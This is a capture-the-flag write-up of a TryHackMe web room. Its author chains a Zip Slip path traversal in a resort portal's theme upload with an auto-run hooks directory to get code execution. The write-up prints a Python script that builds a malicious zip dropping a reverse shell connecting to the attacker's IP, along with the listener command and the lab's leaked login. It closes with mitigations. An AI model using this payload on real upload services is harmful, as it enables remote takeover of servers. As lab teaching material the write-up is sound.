# The Hollow Shell - [TryHackMe Hacker's Holiday 2026](https://tryhackme.com/hackerholidays)

**Room:** [The Hollow Shell (TryHackMe Hacker's Holiday 2026)](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)

**Category:** Web

**Difficulty:** Medium

**Vulnerability class:** Zip Slip (path traversal on archive extraction) leading to Remote Code Execution via an automation hook mechanism - CWE-22

<img width="1908" height="495" alt="image" src="https://github.com/user-attachments/assets/ba3a1f30-a257-4d32-86e1-54cf462e9171" />


---

## Introduction

Byte Lotus is a fictional beachfront resort with a "Shoreline Display" portal that lets staff personalise in-room tablets by uploading a "shell", a `.zip` souvenir pack containing a `shell.json` manifest and optional image/CSS assets. The portal mentions that shells can include "automation hooks" which a background "theme worker" applies shortly after upload. My goal was to figure out what that upload feature actually trusted, and whether the hook mechanism could be abused to get code execution on the server.

## Initial Enumeration

I started with a standard Nmap scan against the target:

```
nmap -sCV 10.49.145.252 -Pn
```

This revealed two open ports: SSH on 22 and an HTTP service on port 5000 running Gunicorn, Visiting the site redirected to a staff login page.

## Finding Credentials

Before trying anything more aggressive, I checked the page source of the login page, and sure enough, an HTML comment contained hardcoded starter credentials left behind by IT:

<img width="1920" height="956" alt="web source page" src="https://github.com/user-attachments/assets/37a04a17-c90b-4b42-beed-d5caf4b231d4" />

```
user: concierge
pass: StayNoticed2024!

```

These logged me straight into the dashboard, which exposed the "Bring a shell ashore" upload feature which was the ZIP upload we'd need to explore.

<img width="1920" height="967" alt="Dashboard" src="https://github.com/user-attachments/assets/a3062c00-7a27-4b81-9026-2dbd046c4d0c" />


## Exploring the Upload Functionality

The upload form's help text was the key clue in this room:

> "A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand. Allowed asset types: png jpg gif svg css json."

This told me two things: first, the manifest schema likely supported fields beyond a simple asset list; second, whatever processed those hooks ran asynchronously, after upload, as a background job and not inside the request/response cycle itself.

I built a minimal manifest to test the baseline behaviour:

<img width="1028" height="667" alt="zip file creation" src="https://github.com/user-attachments/assets/621d9073-36ed-4338-b332-f1ef12548c5a" />


Uploading this returned a confirmation with a storage path:

```
Shell 'user' brought ashore. Stored at shells/e49545d332fe/ and held to the room's ear.
```

I confirmed the extracted file was directly web-accessible:

```bash
curl -i 10.49.145.252:5000/shells/e49545d332fe/shell.json
```

This returned my manifest content with a `200 OK`, confirming the server extracts uploaded zips into a predictable `shells/e49545d332fe/` directory and serves the contents directly. Useful confirmation, but not the vulnerability itself. The real question was what the "hooks" field actually did, and where extracted files could land if the archive's internal paths weren't sanitised.

## Understanding the Vulnerability

Based on the app's behaviour, I inferred the extraction logic wasn't validating the internal paths of zip entries before writing them to disk. This is a classic **Zip Slip** vulnerability: if a zip archive contains an entry name with `../` traversal sequences, and the extraction routine trusts that path literally, files can be written outside the intended `shells/e49545d332fe/` sandbox potentially into any directory the server process has write access to.

Combined with the "automation hooks" the portal mentioned, this suggested a chain: if there's a `hooks/` directory somewhere in the app that the theme worker automatically loads and executes, and I can use zip slip to plant a file directly into that directory instead of my sandboxed upload folder, I could get arbitrary code execution.

## Building the Payload

With an AI's help I wrote a small Python script using the `zipfile` module directly, rather than the `zip` CLI tool, because the CLI sanitises `../` sequences in entry names by default. `zipfile.ZipInfo` lets you set an arbitrary internal path, bypassing that protection:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("<MY_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    info = zipfile.ZipInfo("../../hooks/callback.py")
    z.writestr(info, callback)
```

<img width="1028" height="586" alt="payload" src="https://github.com/user-attachments/assets/e010f1e1-e338-4476-b49d-c21caa52821f" />


The archive contains a normal-looking `shell.json`, plus a second entry whose internal path traverses out of the sandboxed upload folder and into a sibling `hooks/` directory, dropping a Python reverse shell there instead.

## Obtaining Shell Access

With a listener running:

```bash
nc -lvnp 4444
```

I uploaded `reverse-shell.zip` through the portal. It confirmed:

```
Shell 'reverse' brought ashore. Stored at shells/25387129ede2/ and held to the room's ear.
```

Shortly after, the listener caught a connection.

The theme worker had picked up `callback.py` from `hooks/` and executed it, giving me an interactive shell as the `roomservice` user.

## Post-Exploitation

After getting a connection, from `/var/www/conch`, I navigated to the `roomservice` home directory and found the flag directly:

<img width="1014" height="590" alt="flag" src="https://github.com/user-attachments/assets/07abdd96-8940-425c-9fc9-14da93232fc6" />

                            Flag: THM{z1p_sl1pp3d_1nt0_a_sh3ll}

## How I Would Fix It

(Note: I didn't inspect `theme_worker.py` or `app.py` source before capturing the flag, so the below is based on observed behaviour rather than confirmed implementation. It's worth double-checking against the actual source if lab access allows before treating this as final)

The core issue is that the zip extraction routine trusts the internal file paths of the archive rather than sanitising them. Some mitigations:

- Validate every entry path during extraction and reject or strip any entry containing `../` or resolving outside the target directory (Python's `zipfile` requires manual validation — it does not do this by default).
- Extract into an isolated directory and use `os.path.realpath()` to confirm the resolved path stays within the intended sandbox before writing.
- Treat the `hooks` field as untrusted input entirely — don't auto-execute arbitrary files dropped into a directory the theme worker scans; require hooks to be explicitly registered/signed rather than picked up by convention.
- Run the theme worker with the minimum privileges necessary, so even if a hook does execute, its blast radius is limited.

## What I Learned

This room combined two separate weaknesses that were mild on their own. A predictable upload/extraction location, and an under-documented "hooks" feature into a full RCE chain. Neither the upload endpoint nor the hook mechanism individually screamed vulnerability, it was the combination of insecure path handling on extraction with a feature designed to auto-execute files that made this dangerous.

It was also a good reminder that the CLI `zip` tool's default protections (sanitising `../`) can create a false sense of security. the underlying library (`zipfile`) doesn't enforce that at all, and an attacker crafting the archive programmatically bypasses it trivially.
